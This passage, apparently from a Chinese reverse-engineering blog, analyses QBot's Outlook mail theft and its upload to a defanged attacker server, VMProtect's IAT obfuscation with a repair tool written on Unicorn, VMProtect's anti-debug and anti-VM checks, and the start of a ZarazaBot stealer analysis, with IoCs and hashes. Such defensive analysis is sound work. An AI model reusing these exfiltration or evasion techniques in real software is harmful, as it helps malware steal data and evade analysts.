alt=\"image13\"></p>\n<p>然后在当前⽬录下创建⼀个⽂件夹，格式为“<strong>EmailStorage_计算机名_当前时间戳</strong>”。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image14.jpeg\" alt=\"image14\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image15.png\" alt=\"image15.png\"></p>\n<p>接着拼接⼀个名为collector_log.txt的⽂件名，⽤于输出执⾏的⽇志。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image16.jpeg\" alt=\"image16\"></p>\n<p>样本通过MAPIXXXXXXX函数访问outlook的数据，获取当前outlook所存在的邮箱账号。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image17.png\" alt=\"image17.png\"></p>\n<p>然后开始遍历每⼀个邮箱账号，获取详细信息。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image18.png\" alt=\"image18.png\"></p>\n<p>为每个邮箱账号创建名为<strong>”当前索引”</strong>的⽂件夹⽤来保存数据，接着创建线程sub_10002af8执⾏。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image19.jpeg\" alt=\"image19\"></p>\n<p>获取当前邮箱账号所存在的⽂件夹，⽂件夹的名字从数字0开始递增。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image20.png\" alt=\"image20.png\"></p>\n<p>然后获取⽂件夹中的所有邮件，每个邮件的命名从数字<strong>0</strong>开始递增。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image22.png\" alt=\"image22.png\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image23.png\" alt=\"image23.png\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image24.png\" alt=\"image24.png\"></p>\n<p>每获取完⼀个⽂件夹中的邮件时，会⽣成⼀个名为”folder.txt”的⽂件⽤来存储当前⽂件夹的名字。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image25.png\" alt=\"image25.png\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image26.png\" alt=\"image26.png\"></p>\n<p>当邮箱中所有⽂件夹都获取完毕后，⽣成⼀个名为“email.txt”的⽂件⽤来存储当前邮箱账号。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image27.png\" alt=\"image27.png\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image28.png\" alt=\"image28.png\"></p>\n<h3 id=\"2-2、数据回传\"><a href=\"#2-2、数据回传\" class=\"headerlink\" title=\"2.2、数据回传\"></a>2.2、数据回传</h3><p>如果能窃取到outlook邮箱数据，则进⾏数据回传。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image29.png\" alt=\"image29.png\"></p>\n<ul>\n<li>上传Log</li>\n</ul>\n<p>样本将log⽂件读取到内存后，以zip压缩、base64编码的⽅式对内容进⾏加密。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image30.png\" alt=\"image30.png\"></p>\n<p>然后⽣成⼀个json⽂件。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image31.png\" alt=\"image31.png\"></p>\n<p>然后⽤<strong>https+post</strong>的⽅式回传⾄攻击者的服务器<strong>hxxps:&#x2F;&#x2F;82.118.22.125&#x2F;bgate</strong></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image33.png\" alt=\"image33.png\"></p>\n<ul>\n<li>上传邮箱内容</li>\n</ul>\n<p>遍历获取窃取到的邮件⽂件。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image34.png\" alt=\"image34.png\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image35.png\" alt=\"image35.png\"></p>\n<p>将遍历到的邮件⽂件读取到内存。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image37.jpeg\" alt=\"image37\"></p>\n<p>同样先将读取到的数据进⾏zip压缩，然后使⽤base64编码加密。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image38.png\" alt=\"image38.png\"></p>\n<p>然后将数据以json格式进⾏打包。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image40.png\" alt=\"image40.png\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image41.jpeg\" alt=\"image41\"></p>\n<p>最后回传到攻击者服务器。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image42.png\" alt=\"image42.png\"></p>\n<h1 id=\"三、样本运⾏环境搭建\"><a href=\"#三、样本运⾏环境搭建\" class=\"headerlink\" title=\"三、样本运⾏环境搭建\"></a>三、样本运⾏环境搭建</h1><p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image43.png\" alt=\"image43.png\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image44.png\" alt=\"image44.png\"></p>\n<blockquote>\n<p>添加测试的QQ邮箱，添加途中需要到QQ邮箱开通IMAP权限，获取应⽤密码。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image45.png\" alt=\"image45.png\"></p>\n</blockquote>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image46.jpeg\" alt=\"image46\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image47.jpeg\" alt=\"image47\"></p>\n<p>然后设置Outlook为默认使⽤的邮件软件。Win+i打开设置→应⽤→默认设置。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image48.jpeg\" alt=\"image48\"></p>\n<p>使⽤编写代码⽤来加载样本(93d6d599c37d1858cc86c0d8fe8fb8d4)</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image49.png\" alt=\"image49.png\"></p>\n<p>打开fakenet和⽕绒剑后将编写好的程序拖⼊⽕绒剑进⾏监控。（因为样本使⽤的是HTTPS加密协议，需要过滤⽹络数据才能看到明⽂数据，所以使⽤fakenet）。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image50.jpeg\" alt=\"image50\"></p>\n<p>可以看到样本执⾏过程中在遍历⽬录寻找Outlook.exe。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image51.jpeg\" alt=\"image51\"></p>\n<p>且傀儡程序被加载。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image52.jpeg\" alt=\"image52\"></p>\n<p>可以看到⽂件已经被窃取到指定⽬录下</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image53.png\" alt=\"image53.png\"></p>\n<p>fakenet也能捕获到回传的数据。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image54.jpeg\" alt=\"image54\"></p>\n<p>由于样本发送后会将⽂件删除，所以重复上⾯的操作，利⽤⽕绒剑⾃定义防护，禁⽌⽂件删除。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image55.png\" alt=\"image55.png\"></p>\n<p>拿到窃取的⽂件</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image56.png\" alt=\"image56.png\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image57.jpeg\" alt=\"image57\"></p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image58.png\" alt=\"image58.png\"></p>\n<p>Outlook的⽂件夹数为14，刚好对应上窃取到的⽂件夹编号。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image59.png\" alt=\"image59.png\"></p>\n<p>且每个⽂件夹下都保存着实际⽂件夹名。</p>\n<p><img src=\"/../images/Virus/QBot-Outlook%E7%AA%83%E5%AF%86/image60.jpeg\" alt=\"image60\"></p>\n<h1 id=\"四、IoC\"><a href=\"#四、IoC\" class=\"headerlink\" title=\"四、IoC\"></a>四、IoC</h1><p><strong>URL</strong>：</p>\n<p>hxxps:&#x2F;&#x2F;82.118.22.125&#x2F;bgate</p>\n<p><strong>MD5</strong>：</p>\n<p>93D6D599C37D1858CC86C0D8FE8FB8D4</p>\n<p>9B0A4E5E5227B766EDE92340D7064545</p>\n<p>18152190D3637C3A24BA40046324B79C</p>\n<p><strong>开源报告：</strong></p>\n<p>(An Old Bot’s Nasty New Tricks: Exploring Qbot’s Latest Attack Methods)<a href=\"https://research.checkpoint.com/2020/exploring-qbots-latest-attack-methods/\">https://research.checkpoint.com/2020/exploring-qbots-latest-attack-methods/</a></p>\n","categories":["Virus"]},{"title":"VMProtect分析-IAT修复","url":"/2024/04/21/VMProtect%E5%88%86%E6%9E%90-IAT%E4%BF%AE%E5%A4%8D/","content":"<h1 id=\"一、IAT保护方式\"><a href=\"#一、IAT保护方式\" class=\"headerlink\" title=\"一、IAT保护方式\"></a>一、IAT保护方式</h1><p>原函数调用代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004018EE FF 15 0C 30 40 00                       call    ds:__imp__GetSystemTimeAsFileTime@4</span><br></pre></td></tr></table></figure>\n\n<p>经过IAT保护后：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00D118FD | 52           \t| push edx                           \t|</span><br><span class=\"line\">00D118FE | E8 66A33000  \t| call vmpfuck.vmp.101BC69           \t|</span><br><span class=\"line\">00D11903 | 3145 FC          | xor dword ptr ss:[ebp-4],eax          |</span><br></pre></td></tr></table></figure>\n\n<p>由于原字节大小为6，vmp保护后使用了<code>call vmpSeg</code>使得字节为5，但由于要统一，因此添加了一个push reg指令。</p>\n<p>跟进函数后，使用调试器的跟踪功能进行记录，得到代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0101BC69 | 90           \t| nop                                \t|</span><br><span class=\"line\">0101BC6A | 99           \t| cdq                                \t|</span><br><span class=\"line\">0101BC6B | BA 49578563  \t| mov edx,63855749                   \t|</span><br><span class=\"line\">0101BC70 | 0FCA         \t| bswap edx                          \t|</span><br><span class=\"line\">0101BC72 | 5A           \t| pop edx                            \t|\t;弹出堆栈,抵消外层的push edx,同时获取返回到地址,即edx=0x00D11903</span><br><span class=\"line\">0101BC73 | E9 33B9EBFF  \t| jmp vmpfuck.vmp.ED75AB             \t|</span><br><span class=\"line\">00ED75AB | 871424       \t| xchg dword ptr ss:[esp],edx        \t|\t;重新讲返回到地址写入到栈顶</span><br><span class=\"line\">00ED75AE | E9 7C020F00  \t| jmp vmpfuck.vmp.FC782F             \t|</span><br><span class=\"line\">00FC782F | 52           \t| push edx                           \t|</span><br><span class=\"line\">00FC7830 | BA 1715D100  \t| mov edx,vmpfuck.vmp.D11517         \t|</span><br><span class=\"line\">00FC7835 | 8B92 9FAE2B00\t| mov edx,dword ptr ds:[edx+2BAE9F]  \t|</span><br><span class=\"line\">00FC783B | 8D92 48604129\t| lea edx,dword ptr ds:[edx+29416048]\t|\t;GetSystemTimeAsFileTime函数地址</span><br><span class=\"line\">00FC7841 | E9 2657F1FF  \t| jmp vmpfuck.vmp.EDCF6C             \t|</span><br><span class=\"line\">00EDCF6C | 871424       \t| xchg dword ptr ss:[esp],edx        \t|\t;写入到栈顶</span><br><span class=\"line\">00EDCF6F | E9 172FE5FF  \t| jmp vmpfuck.vmp.D2FE8B             \t|</span><br><span class=\"line\">00D2FE8B | C3           \t| ret                                \t|\t;调用api函数</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"二、修复方法\"><a href=\"#二、修复方法\" class=\"headerlink\" title=\"二、修复方法\"></a>二、修复方法</h1><p>经过多次尝试发现，IAT函数的调用全部指向VMP0，且函数头部都为<code>nop</code>指令。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-IAT%E4%BF%AE%E5%A4%8D/image-20230117161756094.png\" alt=\"image-20230117161756094\"></p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-IAT%E4%BF%AE%E5%A4%8D/image-20230117161815125.png\" alt=\"image-20230117161815125\"></p>\n<p>因此可以直接暴力搜索<code>.text</code>段的<code>E8 ?? ?? ?? ??</code>,然后计算出call的地址是否属于<code>vmp0</code>段，再判断函数头部是否为nop指令来进行修复。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//搜素call vmp0的地址</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> n = <span class=\"number\">0</span>; n &lt; detail-&gt;x86.op_count; n++) &#123;</span><br><span class=\"line\">    cs_x86_op* op = &amp;(detail-&gt;x86.operands[n]);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (op-&gt;type)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> X86_OP_IMM:</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                ULONG_PTR callAddr = op-&gt;imm;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (callAddr &gt; segs[<span class=\"number\">3</span>].base &amp;&amp;</span><br><span class=\"line\">                    callAddr &lt; segs[<span class=\"number\">3</span>].base + segs[<span class=\"number\">3</span>].size) <span class=\"comment\">//是否在VMP0段</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> nop=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">                    <span class=\"built_in\">uc_mem_read</span>(uc, callAddr,&amp;nop,<span class=\"number\">1</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (nop == <span class=\"number\">0x90</span>)</span><br><span class=\"line\">                        vec_iatList.<span class=\"built_in\">push_back</span>(insn-&gt;address);<span class=\"comment\">//添加</span></span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>将符合条件的添加在vec数组中，然后进行unicorn模拟执行到ret。</p>\n<p>由于模拟环境中没有api模块，因此会产生异常，通过检测异常前的指令是否为<code>ret</code>来进行修复。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-IAT%E4%BF%AE%E5%A4%8D/image-20230117182421318.png\" alt=\"image-20230117182421318\"></p>\n<p>此时堆栈的值如下表：</p>\n<table>\n<thead>\n<tr>\n<th>addr</th>\n<th>value</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>esp</td>\n<td>api函数地址</td>\n</tr>\n<tr>\n<td>esp+4</td>\n<td>正常返回到地址</td>\n</tr>\n</tbody></table>\n<p>因此读取栈顶值即可获取到api地址，然后再遍历模块中的IAT进行函数名获取。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-IAT%E4%BF%AE%E5%A4%8D/image-20230117182609319.png\" alt=\"image-20230117182609319\"></p>\n<p>然后修复<code>esp</code>和<code>eip</code>来使模拟器继续正常运行。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-IAT%E4%BF%AE%E5%A4%8D/image-20230117182732236.png\" alt=\"image-20230117182732236\"></p>\n<p>修复效果如下：</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-IAT%E4%BF%AE%E5%A4%8D/image-20230117182747410.png\" alt=\"image-20230117182747410\"></p>\n<p>github:<a href=\"https://github.com/PlaneJun/vmp_fixiat\">https://github.com/PlaneJun/vmp_fixiat</a></p>\n","categories":["Anti"]},{"title":"VMProtect分析-加载器","url":"/2023/06/14/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/","content":"<blockquote>\n<p>分析对象为网上流传的VMP源码</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th>源码路径</th>\n<th>函数名</th>\n<th>行号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>runtime\\loader.cc</td>\n<td>SetupImage</td>\n<td>884</td>\n</tr>\n</tbody></table>\n<h1 id=\"1、反调试\"><a href=\"#1、反调试\" class=\"headerlink\" title=\"1、反调试\"></a>1、反调试</h1><h2 id=\"1-1-用户模式\"><a href=\"#1-1-用户模式\" class=\"headerlink\" title=\"1.1 用户模式\"></a>1.1 用户模式</h2><p><code>line:17492</code>通过检测PEB-&gt;BeingDebugged,常规手段了，没什么好说。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230614144109419.png\" alt=\"image-20230614144109419\"></p>\n<p>然后就是通过<code>NtSetInformationProcess</code>、<code>NtQueryInformationProcess</code>、<code>NtSetInformationThread</code>进行反调试，各功能如下：</p>\n<ul>\n<li><p>NtSetInformationProcess：如果是window10则调用，参数二为<code>ProcessInstrumentationCallback</code>。这个参数主要是注册一个回调，在Windows系统Vista以及之后的版本中，可以使用KPROCESS-&gt;InstrumentationCallback来指定回调函数的地址，每次函数从内核态返回用户态之后系统都会调用指定的回调函数。但是这里VMP设置了一个NULL的值，猜测可能是有人利用了这种机制来进行绕过反调试，因此清空这个位置。<br><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230614153757178.png\" alt=\"image-20230614153757178\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//https://pastebin.com/9TqRGsM5</span></span><br><span class=\"line\"><span class=\"comment\">//https://secrary.com/Random/InstrumentationCallback/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//------64-Bit---------------</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ProcessInstrumentationCallback 0x28</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">DbgBreakPoint</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">int</span> __stdcall <span class=\"title\">ZwSetInformationProcess</span><span class=\"params\">(HANDLE,<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>,<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>*,<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>)</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span>* <span class=\"title\">BeingDebugged</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> Cano= <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">ZwSetInformationProcess</span>(<span class=\"built_in\">GetCurrentProcess</span>(),ProcessInstrumentationCallback,&amp;Cano,<span class=\"number\">0x8</span>);</span><br><span class=\"line\">    <span class=\"built_in\">MessageBox</span>(<span class=\"number\">0</span>,<span class=\"string\">L&quot;Being Debugged\\r\\n&quot;</span>,<span class=\"string\">L&quot;waliedassar&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">ExitProcess</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> Cano= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span>)&amp;BeingDebugged;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret=<span class=\"built_in\">ZwSetInformationProcess</span>(<span class=\"built_in\">GetCurrentProcess</span>(),ProcessInstrumentationCallback,&amp;Cano,<span class=\"number\">0x8</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(ret==<span class=\"number\">0xC0000061</span>) <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Expected\\r\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>NtQueryInformationProcess：查询<code>ProcessDebugPort</code>、<code>ProcessDebugObjectHandle</code><br><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230614155347062.png\" alt=\"image-20230614155347062\"></p>\n</li>\n<li><p>NtSetInformationThread：传入<code>ThreadHideFromDebugger</code>隐藏线程，也是老常规了。<br><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230614155939314.png\" alt=\"image-20230614155939314\"></p>\n</li>\n</ul>\n<p>最后利用异常机制检测反调试。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230615140914317.png\" alt=\"image-20230615140914317\"></p>\n<p>如果存在调试器则会继续执行<code>__writeeflags</code>之后的代码，否则会进入自己的异常函数执行。</p>\n<h2 id=\"1-2-内核模式\"><a href=\"#1-2-内核模式\" class=\"headerlink\" title=\"1.2 内核模式\"></a>1.2 内核模式</h2><p>内核模式本质上还是跟用户模式没什么区别，主要是调用<code>NtQuerySystemInformation</code>以查询系统为主，拦截双机调试为主。</p>\n<ul>\n<li><p>SystemKernelDebuggerInformation：通过传入<code>SystemKernelDebuggerInformation</code>查询<code>DebuggerEnabled</code>和<code>DebuggerNotPresent</code>是否有值。<br><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230614160245866.png\" alt=\"image-20230614160245866\"></p>\n</li>\n<li><p>SystemModuleInformation：通过判断是否存在一些调试设备。这里可以去看我反调试那篇文章，符号的那一节。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\\\.\\SICE </span><br><span class=\"line\">\\\\.\\SIWVID</span><br><span class=\"line\">\\\\.\\NTICE</span><br><span class=\"line\">\\\\.\\ICEEXT</span><br><span class=\"line\">\\\\.\\SYSER</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230614162012174.png\" alt=\"image-20230614162012174\"></p>\n</li>\n</ul>\n<h2 id=\"1-3-API检测\"><a href=\"#1-3-API检测\" class=\"headerlink\" title=\"1.3 API检测\"></a>1.3 API检测</h2><p>检测头部是否为<code>0xCC</code>,对抗软件断点。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230615150745485.png\" alt=\"image-20230615150745485\"></p>\n<h2 id=\"1-4-内存检测\"><a href=\"#1-4-内存检测\" class=\"headerlink\" title=\"1.4 内存检测\"></a>1.4 内存检测</h2><p>VMP会查询整个镜像模块中原可执行的代码是否被设置为了无权限，对抗内存断点。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230615150835541.png\" alt=\"image-20230615150835541\"></p>\n<h1 id=\"2、检测虚拟机\"><a href=\"#2、检测虚拟机\" class=\"headerlink\" title=\"2、检测虚拟机\"></a>2、检测虚拟机</h1><h2 id=\"2-1-CPUID\"><a href=\"#2-1-CPUID\" class=\"headerlink\" title=\"2.1 CPUID\"></a>2.1 CPUID</h2><p>老常规，<code>cpuid</code></p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230615103046007.png\" alt=\"image-20230615103046007\"></p>\n<p>首先使用eax&#x3D;1参数调用cpuid检测ecx的31位是否为1来检测虚拟机。(虚拟机下为1)</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230615103128257.png\" alt=\"image-20230615103128257\"></p>\n<p>然后在进行eax&#x3D;0x40000000获取CPU的信息，判断字符串是否为正常字符串。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230615103243845.png\" alt=\"image-20230615103243845\"></p>\n<h2 id=\"2-3-系统固件\"><a href=\"#2-3-系统固件\" class=\"headerlink\" title=\"2.3 系统固件\"></a>2.3 系统固件</h2><p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230615143818429.png\" alt=\"image-20230615143818429\"></p>\n<p>通过<code>EnumSystemFirmwareTables</code>和<code>GetSystemFirmwareTable </code>判断原始固件表是否存在虚拟机的名字。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230615143924614.png\" alt=\"image-20230615143924614\"></p>\n<p>检测的内容有</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">QEMU</span><br><span class=\"line\">Microsoft</span><br><span class=\"line\">innotek</span><br><span class=\"line\">VirtuaiBox</span><br><span class=\"line\">VMware</span><br><span class=\"line\">Parallels</span><br></pre></td></tr></table></figure>\n\n<p>如果上述函数无法调用，则通过打开设备<code>\\\\device\\\\physicalmemory</code>来检查是否存在上述固件名字</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230615144654549.png\" alt=\"image-20230615144654549\"></p>\n<h2 id=\"2-4-检测固定DLL\"><a href=\"#2-4-检测固定DLL\" class=\"headerlink\" title=\"2.4 检测固定DLL\"></a>2.4 检测固定DLL</h2><p>检测<code>SBIEDLL.DLL</code>是否存在，这个DLL是沙箱(Sandboxie)的一个组件。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20230615150029661.png\" alt=\"image-20230615150029661\"></p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>只是分析了基于windows反调试和反虚拟机，linux和mac方面的也大吃差不多。至于内存CRC校验的东西就不看啦！</p>\n<p>对于检测虚拟机和调试基本上就是比较常规的东西，但还是有意外收货！！！！</p>\n<p>一个是<code>KPROCESS-&gt;InstrumentationCallback</code>这个标志位，这个可能在之后编程的时候会用到，觉得非常牛逼，嘎嘎嘎！！！！</p>\n","categories":["Anti"]},{"title":"ZarazaBot窃取浏览器密码样本分析","url":"/2024/04/21/ZarazaBot%E7%AA%83%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","content":"<h1 id=\"一、样本标签\"><a href=\"#一、样本标签\" class=\"headerlink\" title=\"一、样本标签\"></a>一、样本标签</h1><table>\n<thead>\n<tr>\n<th>标签名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>原始⽂件名</td>\n<td>ISBEW64.exe</td>\n</tr>\n<tr>\n<td>MD5</td>\n<td>41d5fda21cf991734793df190ff078ba</td>\n</tr>\n<tr>\n<td>⽂件⼤⼩</td>\n<td>296.50 KB (303616 bytes)</td>\n</tr>\n<tr>\n<td>⽂件格式</td>\n<td>PE64</td>\n</tr>\n<tr>\n<td>加壳类型</td>\n<td>无</td>\n</tr>\n<tr>\n<td>编译语⾔</td>\n<td>.NET</td>\n</tr>\n<tr>\n<td>SHA-1</td>\n<td>b50a8e2a7998e17286d2e18d1cf3f7e4e84482c6</td>\n</tr>\n<tr>\n<td>SHA-256</td>\n<td>2cb42e07dbdfb0227213c50af87b2594ce96889fe623dbd73d228e46572f0125</td>\n</tr>\n<tr>\n<td>开源报告</td>\n<td><a href=\"https://www.uptycs.com/blog/zaraza-bot-credential-password-stealer\">https://www.uptycs.com/blog/zaraza-bot-credential-password-stealer</a></td>\n</tr>\n</tbody></table>\n<h1 id=\"二、详细分析\"><a href=\"#二、详细分析\" class=\"headerlink\" title=\"二、详细分析\"></a>二、详细分析</h1><p>样本(41d5fda21cf991734793df190ff078ba)运行时获取受害者计算机的用户名，然后在<code>%TEMP%</code>目录中使用该名称创建一个新的子文件夹。</p>\n<p><img 